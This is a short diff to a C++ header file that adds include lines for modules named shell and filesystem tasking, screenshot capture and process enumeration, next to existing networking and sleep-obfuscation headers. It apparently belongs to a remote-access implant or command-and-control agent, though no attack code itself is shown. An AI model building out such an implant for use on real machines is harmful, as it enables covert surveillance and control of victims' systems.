@@ -12,5 +12,13 @@
 #include "networking/send.hpp"
 #include "networking/recieve.hpp"
 #include "obfuscation/sleep.hpp"
+#include "util/io.hpp"
+#include "tasking/basic/filesystem.hpp"
+#include "tasking/basic/shell.hpp"
+#include "reconaissance/basic.hpp"
+#include "reconaissance/screenshot.hpp"
+#include "reconaissance/procenum.hpp"
+
+
 
 #endif //MAIN_HPP
